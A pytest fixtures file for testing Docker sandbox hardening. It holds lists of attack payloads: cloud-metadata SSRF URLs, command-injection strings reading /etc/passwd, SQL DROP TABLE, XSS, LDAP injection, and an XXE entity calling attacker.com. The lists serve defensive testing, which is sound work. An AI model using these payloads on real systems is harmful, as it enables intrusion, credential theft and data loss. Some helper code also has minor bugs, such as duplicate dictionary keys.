"""
Shared pytest fixtures and configuration for sandbox security tests.
"""

import pytest
import docker
import time
from typing import Generator, Dict, Any


# ============================================================================
# Docker Client Fixtures
# ============================================================================

@pytest.fixture(scope="session")
def docker_client() -> docker.DockerClient:
    """Create a Docker client for the test session"""
    client = docker.from_env()
    # Verify Docker is available
    client.ping()
    yield client
    client.close()


@pytest.fixture(scope="function")
def sandbox_container(docker_client: docker.DockerClient) -> Generator[docker.models.containers.Container, None, None]:
    """
    Create a secure sandbox container with all security restrictions.
    This is the standard test container with all security restrictions applied.
    """
    container = docker_client.containers.run(
        "alpine:latest",
        command="sleep 300",
        detach=True,
        network_mode="none",
        read_only=True,
        cap_drop=["ALL"],
        security_opt=["no-new-privileges:true"],
        mem_limit="128m",
        cpu_quota=50000,
        pids_limit=50,
        tmpfs={"/tmp": "rw,noexec,nosuid,size=10m"},
        user="1000:1000",  # Non-root user
    )
    
    # Wait for container to be ready
    time.sleep(0.5)
    
    yield container
    
    # Cleanup
    try:
        container.remove(force=True)
    except Exception:
        pass


@pytest.fixture(scope="function")
def sandbox_container_root(docker_client: docker.DockerClient) -> Generator[docker.models.containers.Container, None, None]:
    """
    Create a sandbox container running as root (for testing root-specific restrictions).
    """
    container = docker_client.containers.run(
        "alpine:latest",
        command="sleep 300",
        detach=True,
        network_mode="none",
        read_only=True,
        cap_drop=["ALL"],
        security_opt=["no-new-privileges:true"],
        mem_limit="128m",
        cpu_quota=50000,
        pids_limit=50,
        tmpfs={"/tmp": "rw,noexec,nosuid,size=10m"},
    )
    
    time.sleep(0.5)
    
    yield container
    
    try:
        container.remove(force=True)
    except Exception:
        pass


@pytest.fixture(scope="function")
def privileged_container(docker_client: docker.DockerClient) -> Generator[docker.models.containers.Container, None, None]:
    """
    Create a privileged container WITHOUT security restrictions.
    Used as a control for negative testing.
    """
    container = docker_client.containers.run(
        "alpine:latest",
        command="sleep 300",
        detach=True,
        network_mode="bridge",
        privileged=True,
    )
    
    time.sleep(0.5)
    
    yield container
    
    try:
        container.remove(force=True)
    except Exception:
        pass


@pytest.fixture(scope="function")
def container_with_network(docker_client: docker.DockerClient) -> Generator[docker.models.containers.Container, None, None]:
    """Container with network access but other restrictions"""
    container = docker_client.containers.run(
        "alpine:latest",
        command="sleep 300",
        detach=True,
        network_mode="bridge",
        read_only=True,
        cap_drop=["ALL"],
        security_opt=["no-new-privileges:true"],
        mem_limit="128m",
        cpu_quota=50000,
        pids_limit=50,
    )
    
    time.sleep(0.5)
    
    yield container
    
    try:
        container.remove(force=True)
    except Exception:
        pass


# ============================================================================
# Test Data Fixtures
# ============================================================================

@pytest.fixture
def malicious_payloads() -> Dict[str, list]:
    """Collection of malicious payloads for testing"""
    return {
        "ssrf": [
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.azure.com/metadata/instance?api-version=2021-02-01",
            "file:///etc/passwd",
            "file:///etc/shadow",
            "dict://localhost:11211/stats",
            "gopher://127.0.0.1:6379/_*3%0D%0A%243%0D%0ASET%0D%0A%241%0D%0Ax%0D%0A%2412%0D%0Ahacked%0D%0A",
        ],
        "command_injection": [
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "`cat /etc/passwd`",
            "$(cat /etc/passwd)",
            "&& cat /etc/passwd",
            "|| cat /etc/passwd",
        ],
        "path_traversal": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "/etc/passwd%00",
            "/etc/passwd%00.png",
        ],
        "sql_injection": [
            "' OR '1'='1",
            "' UNION SELECT * FROM users--",
            "'; DROP TABLE users--",
            "1' OR '1'='1",
        ],
        "xss": [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert('xss')",
            "<svg onload=alert('xss')>",
        ],
        "xxe": [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;]><data/>',
        ],
        "ldap_injection": [
            "*)(uid=*))(|(userPassword=*))",
            "admin)(&(userPassword=*))",
        ],
        "ldap": [
            "*)(uid=*))(|(userPassword=*))",
            "admin)(&(userPassword=*))",
        ],
    }


@pytest.fixture
def safe_test_commands() -> Dict[str, str]:
    """Safe commands for testing container functionality"""
    return {
        "list_root": "ls -la /",
        "check_user": "whoami && id",
        "check_caps": "capsh --print",
        "check_memory": "cat /sys/fs/cgroup/memory.max",
        "check_cpu": "cat /sys/fs/cgroup/cpu.max",
        "check_pids": "cat /sys/fs/cgroup/pids.max",
        "check_mounts": "mount",
        "check_network": "ip addr show",
        "check_processes": "ps aux",
        "check_disk": "df -h",
        "check_user": "whoami",
        "check_caps": "cat /proc/self/status | grep Cap",
    }


# ============================================================================
# Helper Functions
# ============================================================================

def exec_in_container(container, command: str, user: str = None) -> tuple:
    """
    Execute command in container and return (exit_code, output, error).
    """
    exec_kwargs = {}
    if user:
        exec_kwargs["user"] = user
    
    result = container.exec_run(command, **exec_kwargs)
    return (
        result.exit_code,
        result.output.decode() if result.output else "",
        result.output.decode() if result.output else ""  # stderr is combined in output
    )


def assert_container_secure(container) -> None:
    """Assert that container has all security restrictions applied"""
    # Check no network
    exit_code, _, _ = exec_in_container(container, "ping -c 1 8.8.8.8")
    assert exit_code != 0, "Container should not have network access"
    
    # Check read-only filesystem
    exit_code, _, _ = exec_in_container(container, "touch /test_write")
    assert exit_code != 0, "Filesystem should be read-only"
    
    # Check no capabilities
    exit_code, output, _ = exec_in_container(container, "capsh --print")
    assert "Current: =" in output or "Current:" in output.split('\n')[0]
    
    # Check no new privileges
    exit_code, output, _ = exec_in_container(container, "cat /proc/self/status | grep NoNewPrivs")
    assert "NoNewPrivs:\t1" in output


def assert_container_vulnerable(container) -> None:
    """Assert that container is vulnerable (for negative testing)"""
    # Should be able to mount
    exit_code, _, _ = exec_in_container(container, "mount -t tmpfs tmpfs /mnt")
    assert exit_code == 0, "Privileged container should be able to mount"
    
    # Should have capabilities
    exit_code, output, _ = exec_in_container(container, "capsh --print")
    assert "Current:" in output and "=" not in output.split("Current:")[1].split('\n')[0]


# ============================================================================
# Pytest Configuration
# ============================================================================

def pytest_configure(config):
    """Configure pytest"""
    config.addinivalue_line("markers", "requires_docker: mark test as requiring Docker")
    config.addinivalue_line("markers", "requires_privileged: mark test as requiring privileged container")
    config.addinivalue_line("markers", "security: mark test as security test")
    config.addinivalue_line("markers", "slow: mark test as slow")


def pytest_collection_modifyitems(config, items):
    """Modify test collection to add markers automatically"""
    for item in items:
        # Mark all tests in security test files as security tests
        if "security" in str(item.fspath):
            item.add_marker(pytest.mark.security)
        
        # Mark tests requiring Docker
        if "docker_client" in item.fixturenames:
            item.add_marker(pytest.mark.requires_docker)
        
        # Mark tests requiring privileged containers
        if "privileged_container" in item.fixturenames:
            item.add_marker(pytest.mark.requires_privileged)


# ============================================================================
# Session Fixtures
# ============================================================================

@pytest.fixture(scope="session", autouse=True)
def check_docker_available():
    """Ensure Docker is available before running tests"""
    try:
        client = docker.from_env()
        client.ping()
        yield
    except Exception as e:
        pytest.skip(f"Docker not available: {e}")
    finally:
        try:
            client.close()
        except:
            pass


# ============================================================================
# Test Utilities
# ============================================================================

class ContainerAssertions:
    """Helper class for container security assertions"""
    
    def __init__(self, container):
        self.container = container
    
    def assert_no_network(self):
        """Assert container has no network access"""
        exit_code, _, _ = self.container.exec_run("ping -c 1 8.8.8.8")
        assert exit_code != 0, "Container should not have network access"
    
    def assert_readonly_fs(self):
        """Assert filesystem is read-only"""
        exit_code, _, _ = self.container.exec_run("touch /test_write")
        assert exit_code != 0, "Filesystem should be read-only"
    
    def assert_no_caps(self):
        """Assert no capabilities"""
        exit_code, output, _ = self.container.exec_run("capsh --print")
        assert exit_code == 0
        assert "Current: =" in output or "Current:" in output.split('\n')[0]
    
    def assert_no_new_privs(self):
        """Assert no-new-privileges is set"""
        exit_code, output, _ = self.container.exec_run("cat /proc/self/status | grep NoNewPrivs")
        assert "NoNewPrivs:\t1" in output
    
    def assert_no_suid(self):
        """Assert no SUID binaries"""
        exit_code, output, _ = self.container.exec_run("find / -perm -4000 -type f 2>/dev/null")
        assert output.strip() == ""
    
    def assert_no_mount(self):
        """Assert cannot mount"""
        exit_code, _, _ = self.container.exec_run("mount -t tmpfs tmpfs /mnt")
        assert exit_code != 0
    
    def assert_no_docker_socket(self):
        """Assert no Docker socket access"""
        exit_code, output, _ = self.container.exec_run("ls /var/run/docker.sock 2>&1")
        assert "No such file" in output or exit_code != 0
    
    def assert_memory_limit(self, max_bytes: int = 134217728):
        """Assert memory limit is set"""
        exit_code, output, _ = self.container.exec_run("cat /sys/fs/cgroup/memory.max")
        assert exit_code == 0
        assert output.strip() != "max"
        assert int(output.strip()) <= max_bytes
    
    def assert_cpu_quota(self, max_quota: int = 50000):
        """Assert CPU quota is set"""
        exit_code, output, _ = self.container.exec_run("cat /sys/fs/cgroup/cpu.max")
        assert exit_code == 0
        assert str(max_quota) in output
    
    def assert_pid_limit(self, max_pids: int = 50):
        """Assert PID limit"""
        exit_code, output, _ = self.container.exec_run("cat /sys/fs/cgroup/pids.max")
        assert exit_code == 0
        assert int(output.strip()) <= max_pids


@pytest.fixture
def secure_container_assertions(sandbox_container):
    """Provide assertion helpers for secure container"""
    return ContainerAssertions(sandbox_container)


# ============================================================================
# Utility Functions
# ============================================================================

def build_test_image(dockerfile: str, tag: str) -> str:
    """Build a test Docker image and return the tag"""
    import tempfile
    import os
    
    with tempfile.TemporaryDirectory() as tmpdir:
        dockerfile_path = os.path.join(tmpdir, "Dockerfile")
        with open(dockerfile_path, "w") as f:
            f.write(dockerfile)
        
        client = docker.from_env()
        image, _ = client.images.build(path=tmpdir, tag=tag, rm=True)
        return tag


# ============================================================================
# Test Data Constants
# ============================================================================

# Common attack vectors for testing
ATTACK_VECTORS = {
    "ssrf_payloads": [
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://127.0.0.1:8080/admin",
        "file:///etc/passwd",
        "file:///etc/shadow",
        "dict://localhost:11211/stats",
    ],
    "command_injection": [
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "`cat /etc/passwd`",
        "$(cat /etc/passwd)",
        "&& cat /etc/passwd",
    ],
    "path_traversal": [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    ],
    "sql_injection": [
        "' OR '1'='1",
        "' UNION SELECT * FROM users--",
        "'; DROP TABLE users--",
    ],
}

# Expected secure container configuration
SECURE_CONTAINER_CONFIG = {
    "network_mode": "none",
    "read_only": True,
    "cap_drop": ["ALL"],
    "security_opt": ["no-new-privileges:true"],
    "mem_limit": "128m",
    "cpu_quota": 50000,
    "pids_limit": 50,
    "tmpfs": {"/tmp": "rw,noexec,nosuid,size=10m"},
    "user": "1000:1000",
}

# Privileged container config (for negative testing)
PRIVILEGED_CONTAINER_CONFIG = {
    "network_mode": "bridge",
    "privileged": True,
}